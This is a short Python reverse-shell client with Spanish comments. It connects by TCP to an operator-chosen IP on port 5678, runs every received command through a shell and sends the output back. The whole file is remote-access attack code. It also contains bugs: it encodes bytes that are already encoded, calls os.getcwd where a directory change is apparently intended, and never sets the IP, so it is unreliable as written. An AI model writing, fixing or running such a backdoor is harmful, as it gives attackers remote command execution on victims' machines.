import socket
import os
import subprocess


def shell():
    current_dir = os.getcwd().encode('utf-8')
    client.send(current_dir.encode('utf-8'))
    while True:
        res = client.recv(3000) 
        if res.decode('utf-8').find("cd") == 0 and len(res.decode('utf-8')) > 2:
            os.getcwd(res[3:]) 
            result = os.getcwd()
            client.send(result.encode('utf-8'))
            print(f"Directorio cambiado a: {result}")
        
        else:
            proc = subprocess.Popen(res.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)                       
            result = proc.stdout.read() + proc.stderr.read()
            print(f"Resultado del comando: {result.decode('utf-8')}")
            ruta = os.getcwd()

            if len(result) == 0:
                client.send(ruta)
            else:
                client.send(result)


def config():
    global client
    global ip
    global port

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # ip = tu ipV4
    port = 5678

    client.connect((ip, port))

config()
shell()
client.close()
